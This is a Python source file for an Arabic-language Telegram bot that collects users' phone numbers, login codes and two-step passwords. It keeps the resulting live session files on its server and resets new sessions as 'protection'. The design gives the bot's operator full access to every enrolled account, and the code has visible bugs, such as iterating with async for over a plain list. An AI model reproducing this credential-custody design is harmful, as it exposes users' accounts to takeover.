import asyncio
import logging
import os
import sys
import time
from datetime import datetime
from typing import Dict, List, Any, Optional

from telethon import TelegramClient, events, Button, functions, types
from telethon.errors import *
from motor.motor_asyncio import AsyncIOMotorClient
from dotenv import load_dotenv
import json
import hashlib
from functools import wraps

# --- الإعدادات والثوابت ---
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger("UltimateManager")

# تحميل متغيرات البيئة
load_dotenv()

# ثوابت الإعدادات
API_ID = int(os.getenv('API_ID', '0'))
API_HASH = os.getenv('API_HASH', '')
BOT_TOKEN = os.getenv('BOT_TOKEN', '')
MONGO_URI = os.getenv('MONGO_URI', 'mongodb://localhost:27017')
DEVELOPER_ID = int(os.getenv('DEVELOPER_ID', '0'))
MONITOR_INTERVAL = int(os.getenv('MONITOR_INTERVAL', '20'))  # بالثواني
MAX_RETRIES = int(os.getenv('MAX_RETRIES', '3'))

# --- قاعدة البيانات ---
class Database:
    """فئة لإدارة اتصال قاعدة البيانات والعمليات الأساسية"""
    
    def __init__(self):
        self.client = AsyncIOMotorClient(MONGO_URI)
        self.db = self.client['telegram_ultimate_manager']
        self.users = self.db['users']
        self.accounts = self.db['accounts']
        
    async def get_acc(self, acc_id: str) -> Optional[Dict]:
        """الحصول على بيانات حساب معين"""
        try:
            return await self.accounts.find_one({'_id': acc_id})
        except Exception as e:
            logger.error(f"Error getting account {acc_id}: {e}")
            return None
    
    async def save_acc(self, data: Dict) -> bool:
        """حفظ بيانات حساب جديد"""
        try:
            await self.accounts.insert_one(data)
            return True
        except Exception as e:
            logger.error(f"Error saving account: {e}")
            return False
    
    async def update_acc(self, acc_id: str, data: Dict) -> bool:
        """تحديث بيانات حساب"""
        try:
            result = await self.accounts.update_one({'_id': acc_id}, {'$set': data})
            return result.modified_count > 0
        except Exception as e:
            logger.error(f"Error updating account {acc_id}: {e}")
            return False
    
    async def delete_acc(self, acc_id: str) -> bool:
        """حذف حساب"""
        try:
            result = await self.accounts.delete_one({'_id': acc_id})
            return result.deleted_count > 0
        except Exception as e:
            logger.error(f"Error deleting account {acc_id}: {e}")
            return False
    
    async def get_user_accounts(self, user_id: int) -> List[Dict]:
        """الحصول على جميع حسابات المستخدم"""
        try:
            return await self.accounts.find({'owner_id': user_id}).to_list(100)
        except Exception as e:
            logger.error(f"Error getting accounts for user {user_id}: {e}")
            return []
    
    async def get_monitored_accounts(self) -> List[Dict]:
        """الحصول على جميع الحسابات المراقبة"""
        try:
            return await self.accounts.find({'monitoring': True}).to_list(1000)
        except Exception as e:
            logger.error(f"Error getting monitored accounts: {e}")
            return []

# دالة للتعامل مع الأخطاء
def handle_errors(func):
    """مزخرف للتعامل مع الأخطاء"""
    @wraps(func)
    async def wrapper(*args, **kwargs):
        try:
            return await func(*args, **kwargs)
        except Exception as e:
            logger.error(f"Error in {func.__name__}: {e}")
            return None
    return wrapper

# --- محرك السيطرة والمراقبة ---
class ControlEngine:
    """فئة مسؤولة عن مراقبة الحسابات وكشف الجلسات غير المصرح بها"""
    
    def __init__(self, bot: TelegramClient, db: Database):
        self.bot = bot
        self.db = db
        self.active_monitors: Dict[str, asyncio.Task] = {}
        self.retry_counts: Dict[str, int] = {}

    @handle_errors
    async def start_monitor(self, acc: Dict) -> bool:
        """بدء مراقبة حساب"""
        acc_id = str(acc['_id'])
        if acc_id not in self.active_monitors:
            self.active_monitors[acc_id] = asyncio.create_task(self._monitor_loop(acc))
            logger.info(f"Started monitoring account {acc['phone']}")
            return True
        return False

    @handle_errors
    async def stop_monitor(self, acc_id: str) -> bool:
        """إيقاف مراقبة حساب"""
        if acc_id in self.active_monitors:
            self.active_monitors[acc_id].cancel()
            del self.active_monitors[acc_id]
            logger.info(f"Stopped monitoring account {acc_id}")
            return True
        return False

    @handle_errors
    async def _monitor_loop(self, acc: Dict):
        """حلقة المراقبة الرئيسية"""
        acc_id = str(acc['_id'])
        phone = acc['phone']
        owner_id = acc['owner_id']
        session_file = f'sessions/{phone}'
        
        # إعداد عداد إعادة المحاولة
        retry_count = 0
        
        while retry_count < MAX_RETRIES:
            try:
                client = TelegramClient(session_file, API_ID, API_HASH)
                await client.connect()
                
                if not await client.is_user_authorized():
                    logger.warning(f"Account {phone} is not authorized")
                    break
                
                # إعادة تعيين عداد المحاولات عند الاتصال الناجح
                retry_count = 0
                
                while True:
                    current = await self.db.get_acc(acc_id)
                    if not current or not current.get('monitoring'):
                        break
                    
                    # الحصول على الجلسات الحالية
                    auths = await client(functions.account.GetAuthorizationsRequest())
                    safe_hashes = current.get('existing_sessions', [])
                    
                    # فحص كل جلسة
                    for auth in auths.authorizations:
                        if auth.hash not in safe_hashes:
                            await self._report_and_kill(client, auth, owner_id, phone)
                            # تحديث قائمة الجلسات الآمنة
                            safe_hashes.append(auth.hash)
                            await self.db.update_acc(acc_id, {'existing_sessions': safe_hashes})
                    
                    # الانتظار قبل الفحص التالي
                    await asyncio.sleep(MONITOR_INTERVAL)
                
                await client.disconnect()
                break
                
            except Exception as e:
                retry_count += 1
                logger.error(f"Monitor error for {phone} (attempt {retry_count}/{MAX_RETRIES}): {e}")
                await asyncio.sleep(5 * retry_count)  # زيادة وقت الانتظار مع كل محاولة
        
        # إزالة المراقبة من القائمة بعد انتهاء المحاولات
        if acc_id in self.active_monitors:
            del self.active_monitors[acc_id]
        
        # إشارة المطور بانتهاء المراقبة
        await self.bot.send_message(
            DEVELOPER_ID, 
            f"⚠️ **انتهت مراقبة الحساب:** `{phone}`\n"
            f"السبب: فشل الاتصال بعد {MAX_RETRIES} محاولات"
        )

    @handle_errors
    async def _report_and_kill(self, client: TelegramClient, auth: types.Authorization, 
                              owner_id: int, phone: str):
        """الإبلاغ عن جلسة غير مصرح بها وإنهاؤها"""
        detail_msg = (
            f"🚨 **تنبيه أمني: دخول جديد مكتشف!**\n\n"
            f"📱 **الحساب:** `{phone}`\n"
            f"━━━━━━━━━━━━━━\n"
            f"💻 **الجهاز:** `{auth.device_model}`\n"
            f"🌐 **النظام:** `{auth.platform} {auth.system_version}`\n"
            f"📍 **الدولة:** `{auth.country}`\n"
            f"🌐 **عنوان IP:** `{auth.ip}`\n"
            f"⏰ **الوقت:** `{auth.date_created}`\n"
            f"━━━━━━━━━━━━━━\n"
            f"🛡 **الإجراء:** تم طرد الجلسة تلقائياً وتأمين الحساب."
        )
        
        try:
            # محاولة إنهاء الجلسة
            await client(functions.account.ResetAuthorizationRequest(hash=auth.hash))
            await self.bot.send_message(owner_id, detail_msg)
            logger.info(f"Terminated unauthorized session for {phone}")
        except Exception as e:
            error_msg = f"❌ **فشل طرد الجلسة:** {e}"
            await self.bot.send_message(owner_id, error_msg)
            logger.error(f"Failed to terminate session for {phone}: {e}")

# --- البوت الرئيسي ---
class UltimateBot:
    """الفئة الرئيسية للبوت"""
    
    def __init__(self):
        self.bot = TelegramClient('ultimate_bot', API_ID, API_HASH)
        self.db = Database()
        self.engine = ControlEngine(self.bot, self.db)
        self.states: Dict[int, Dict] = {}

    async def run(self):
        """تشغيل البوت"""
        try:
            await self.bot.start(bot_token=BOT_TOKEN)
            self._setup_handlers()
            
            # بدء مراقبة جميع الحسابات المراقبة
            async for acc in self.db.get_monitored_accounts():
                await self.engine.start_monitor(acc)
            
            logger.info("Bot started successfully")
            await self.bot.run_until_disconnected()
        except Exception as e:
            logger.error(f"Error starting bot: {e}")
            sys.exit(1)

    def _setup_handlers(self):
        """إعداد معالجات الأحداث"""
        
        @self.bot.on(events.NewMessage(pattern='/start'))
        async def start(event):
            """معالج أمر البداية"""
            uid = event.sender_id
            user = await event.get_sender()
            
            # إشعار المطور بوجود مستخدم جديد
            if uid != DEVELOPER_ID:
                await self.bot.send_message(
                    DEVELOPER_ID, 
                    f"👤 **عضو جديد:** {user.first_name}\n"
                    f"🆔 **الآيدي:** `{uid}`\n"
                    f"🔗 **اليوزر:** @{user.username or 'None'}"
                )

            btns = [
                [Button.inline("➕ إضافة حساب", b"add"), Button.inline("📂 حساباتي", b"list")],
                [Button.inline("⚙️ لوحة المطور", b"dev") if uid == DEVELOPER_ID else Button.inline("ℹ️ معلومات", b"info")]
            ]
            await event.respond(
                f"🚀 **مرحباً بك في مركز السيطرة المتقدم**\n\n"
                f"يمكنك هنا إدارة حساباتك ومراقبة الجلسات بدقة متناهية.", 
                buttons=btns
            )

        @self.bot.on(events.CallbackQuery())
        async def cb_handler(event):
            """معالج الأزرار التفاعلية"""
            data = event.data
            uid = event.sender_id

            try:
                if data == b"list":
                    await self._show_accounts(event, uid)
                elif data.startswith(b"view_"):
                    await self._show_account_details(event, data)
                elif data.startswith(b"sessions_"):
                    await self._show_sessions(event, data)
                elif data.startswith(b"toggle_"):
                    await self._toggle_monitoring(event, data)
                elif data.startswith(b"del_"):
                    await self._delete_account(event, data)
                elif data == b"add":
                    await self._start_add_process(event)
                elif data == b"home":
                    await start(event)
                elif data == b"dev" and uid == DEVELOPER_ID:
                    await self._show_dev_panel(event)
                elif data == b"info":
                    await self._show_info(event)
            except Exception as e:
                logger.error(f"Error in callback handler: {e}")
                await event.answer("❌ حدث خطأ، يرجى المحاولة مرة أخرى")

        @self.bot.on(events.NewMessage())
        async def add_process(event):
            """معالج عملية إضافة حساب جديد"""
            uid = event.sender_id
            if uid not in self.states: 
                return
                
            try:
                state = self.states[uid]
                text = event.text.strip()

                if state['step'] == 'phone':
                    await self._process_phone(event, state, text)
                elif state['step'] == 'code':
                    await self._process_code(event, state, text)
                elif state['step'] == 'pass':
                    await self._process_password(event, state, text)
            except Exception as e:
                logger.error(f"Error in add process: {e}")
                await event.respond("❌ حدث خطأ، يرجى المحاولة مرة أخرى")
                if uid in self.states:
                    del self.states[uid]

    async def _show_accounts(self, event, uid):
        """عرض قائمة حسابات المستخدم"""
        accs = await self.db.get_user_accounts(uid)
        if not accs:
            await event.edit("❌ لا توجد حسابات.", buttons=[Button.inline("🔙", b"home")])
            return
            
        btns = [[Button.inline(f"👤 {a['phone']}", f"view_{a['_id']}".encode())] for a in accs]
        btns.append([Button.inline("🔙 رجوع", b"home")])
        await event.edit("📂 **اختر حساباً للتحكم:**", buttons=btns)

    async def _show_account_details(self, event, data):
        """عرض تفاصيل حساب معين"""
        acc_id = data.decode().split('_')[1]
        acc = await self.db.get_acc(acc_id)
        if not acc:
            await event.answer("❌ الحساب غير موجود")
            return
            
        status = "🟢 مراقب" if acc.get('monitoring') else "🔴 غير مراقب"
        btns = [
            [Button.inline("📱 عرض الجلسات النشطة", f"sessions_{acc_id}".encode())],
            [Button.inline("🔄 تفعيل/تعطيل المراقبة", f"toggle_{acc_id}".encode())],
            [Button.inline("🗑 حذف الحساب", f"del_{acc_id}".encode())],
            [Button.inline("🔙 رجوع", b"list")]
        ]
        await event.edit(f"👤 **الحساب:** `{acc['phone']}`\n🛡 **الحالة:** {status}", buttons=btns)

    async def _show_sessions(self, event, data):
        """عرض جلسات حساب معين"""
        acc_id = data.decode().split('_')[1]
        acc = await self.db.get_acc(acc_id)
        if not acc:
            await event.answer("❌ الحساب غير موجود")
            return
            
        await event.answer("⏳ جاري جلب الجلسات...")
        
        try:
            client = TelegramClient(f'sessions/{acc["phone"]}', API_ID, API_HASH)
            await client.connect()
            
            if not await client.is_user_authorized():
                await event.respond("❌ الحساب غير مصرح به، يرجى إضافته مرة أخرى")
                return
                
            auths = await client(functions.account.GetAuthorizationsRequest())
            text = f"📱 **الجلسات النشطة لحساب {acc['phone']}:**\n\n"
            
            for i, a in enumerate(auths.authorizations, 1):
                text += (
                    f"{i}. **الجهاز:** `{a.device_model}`\n"
                    f"   **النظام:** `{a.platform}`\n"
                    f"   **الموقع:** `{a.country}`\n"
                    f"   **IP:** `{a.ip}`\n"
                    f"   **التاريخ:** `{a.date_created.strftime('%Y-%m-%d %H:%M')}`\n\n"
                )
            
            await client.disconnect()
            await event.respond(text, buttons=[Button.inline("🔙 رجوع", f"view_{acc_id}".encode())])
        except Exception as e:
            logger.error(f"Error fetching sessions: {e}")
            await event.respond("❌ حدث خطأ أثناء جلب الجلسات")

    async def _toggle_monitoring(self, event, data):
        """تفعيل/تعطيل مراقبة حساب"""
        acc_id = data.decode().split('_')[1]
        acc = await self.db.get_acc(acc_id)
        if not acc:
            await event.answer("❌ الحساب غير موجود")
            return
            
        new_val = not acc.get('monitoring', False)
        success = await self.db.update_acc(acc_id, {'monitoring': new_val})
        
        if success:
            if new_val:
                await self.engine.start_monitor(acc)
                await event.answer("✅ تم تفعيل المراقبة")
            else:
                await self.engine.stop_monitor(acc_id)
                await event.answer("✅ تم تعطيل المراقبة")
        else:
            await event.answer("❌ فشل تحديث الحالة")
            
        # تحديث الواجهة
        await self._show_account_details(event, data)

    async def _delete_account(self, event, data):
        """حذف حساب"""
        acc_id = data.decode().split('_')[1]
        acc = await self.db.get_acc(acc_id)
        if not acc:
            await event.answer("❌ الحساب غير موجود")
            return
            
        # إيقاف المراقبة إذا كانت نشطة
        if acc.get('monitoring'):
            await self.engine.stop_monitor(acc_id)
        
        # حذف الحساب من قاعدة البيانات
        success = await self.db.delete_acc(acc_id)
        
        if success:
            # محاولة حذف ملف الجلسة
            try:
                session_file = f'sessions/{acc["phone"]}.session'
                if os.path.exists(session_file):
                    os.remove(session_file)
            except Exception as e:
                logger.error(f"Error deleting session file: {e}")
                
            await event.answer("✅ تم حذف الحساب")
            await self._show_accounts(event, event.sender_id)
        else:
            await event.answer("❌ فشل حذف الحساب")

    async def _start_add_process(self, event):
        """بدء عملية إضافة حساب جديد"""
        uid = event.sender_id
        self.states[uid] = {'step': 'phone'}
        await event.edit(
            "📱 أرسل رقم الهاتف مع رمز الدولة (مثال: +9647700000000):", 
            buttons=[Button.inline("❌ إلغاء", b"home")]
        )

    async def _process_phone(self, event, state, text):
        """معالجة رقم الهاتف"""
        uid = event.sender_id
        
        # التحقق من صحة رقم الهاتف
        if not text.startswith('+') or not text[1:].isdigit():
            await event.respond("❌ رقم الهاتف غير صالح، يرجى إدخال رقم صحيح مع رمز الدولة")
            return
            
        # التحقق من وجود الحساب مسبقاً
        existing_acc = await self.db.accounts.find_one({'phone': text})
        if existing_acc:
            await event.respond("❌ هذا الحساب مضاف بالفعل")
            return
            
        # إنشاء عميل جديد وإرسال رمز التحقق
        client = TelegramClient(f'sessions/{text}', API_ID, API_HASH)
        await client.connect()
        
        try:
            req = await client.send_code_request(text)
            state.update({
                'step': 'code', 
                'phone': text, 
                'client': client, 
                'hash': req.phone_code_hash
            })
            await event.respond("📩 أرسل كود التحقق:")
        except Exception as e:
            logger.error(f"Error sending code: {e}")
            await event.respond(f"❌ خطأ في إرسال الكود: {e}")
            await client.disconnect()

    async def _process_code(self, event, state, text):
        """معالجة رمز التحقق"""
        try:
            await state['client'].sign_in(state['phone'], text, phone_code_hash=state['hash'])
            await self._finalize_account(event.sender_id, state['phone'], state['client'])
            await event.respond("✅ تم الإضافة بنجاح!")
            self.states.pop(event.sender_id)
        except SessionPasswordNeededError:
            state['step'] = 'pass'
            await event.respond("🔐 أرسل كلمة السر:")
        except Exception as e:
            logger.error(f"Error signing in with code: {e}")
            await event.respond(f"❌ خطأ في التحقق من الكود: {e}")
            await state['client'].disconnect()

    async def _process_password(self, event, state, text):
        """معالجة كلمة السر"""
        try:
            await state['client'].sign_in(password=text)
            await self._finalize_account(event.sender_id, state['phone'], state['client'])
            await event.respond("✅ تم الدخول!")
            self.states.pop(event.sender_id)
        except Exception as e:
            logger.error(f"Error signing in with password: {e}")
            await event.respond(f"❌ خطأ في كلمة السر: {e}")
            await state['client'].disconnect()

    async def _finalize_account(self, owner_id: int, phone: str, client: TelegramClient):
        """إنهاء عملية إضافة الحساب"""
        try:
            # الحصول على الجلسات الحالية
            auths = await client(functions.account.GetAuthorizationsRequest())
            hashes = [a.hash for a in auths.authorizations]
            
            # إنشاء معرف فريد للحساب
            acc_id = str(int(time.time() * 1000))
            
            # حفظ بيانات الحساب
            acc = {
                '_id': acc_id, 
                'owner_id': owner_id, 
                'phone': phone, 
                'monitoring': True, 
                'existing_sessions': hashes, 
                'created_at': datetime.now()
            }
            
            success = await self.db.save_acc(acc)
            if success:
                # بدء مراقبة الحساب
                await self.engine.start_monitor(acc)
                logger.info(f"Account {phone} added successfully")
            else:
                logger.error(f"Failed to save account {phone}")
                
        except Exception as e:
            logger.error(f"Error finalizing account: {e}")
        finally:
            await client.disconnect()

    async def _show_dev_panel(self, event):
        """عرض لوحة تحكم المطور"""
        total_accounts = await self.db.accounts.count_documents({})
        monitored_accounts = await self.db.accounts.count_documents({'monitoring': True})
        active_monitors = len(self.engine.active_monitors)
        
        stats_text = (
            f"⚙️ **لوحة تحكم المطور**\n\n"
            f"📊 **الإحصائيات:**\n"
            f"• إجمالي الحسابات: {total_accounts}\n"
            f"• الحسابات المراقبة: {monitored_accounts}\n"
            f"• المراقبات النشطة: {active_monitors}\n\n"
            f"🔧 **الإعدادات:**\n"
            f"• فترة المراقبة: {MONITOR_INTERVAL} ثانية\n"
            f"• أقصى عدد من المحاولات: {MAX_RETRIES}\n"
        )
        
        btns = [
            [Button.inline("🔄 إعادة تشغيل المراقبة", b"restart_monitors")],
            [Button.inline("📊 إحصائيات مفصلة", b"detailed_stats")],
            [Button.inline("🔙 رجوع", b"home")]
        ]
        
        await event.edit(stats_text, buttons=btns)

    async def _show_info(self, event):
        """عرض معلومات البوت"""
        info_text = (
            f"ℹ️ **معلومات البوت**\n\n"
            f"هذا البوت مصمم لمراقبة حسابات تيليجرام وحمايتها من الوصول غير المصرح به.\n\n"
            f"**المميزات:**\n"
            f"• إضافة حسابات متعددة\n"
            f"• مراقبة الجلسات النشطة\n"
            f"• كشف الجلسات غير المصرح بها\n"
            f"• إنهاء الجلسات المشبوهة تلقائياً\n\n"
            f"للاستفسار والتواصل: @{event.sender_id}"
        )
        
        await event.edit(info_text, buttons=[Button.inline("🔙 رجوع", b"home")])

if __name__ == '__main__':
    # التأكد من وجود مجلد الجلسات
    if not os.path.exists('sessions'):
        os.makedirs('sessions')
    
    # تشغيل البوت
    try:
        bot = UltimateBot()
        asyncio.run(bot.run())
    except KeyboardInterrupt:
        logger.info("Bot stopped by user")
    except Exception as e:
        logger.error(f"Fatal error: {e}")
        sys.exit(1)
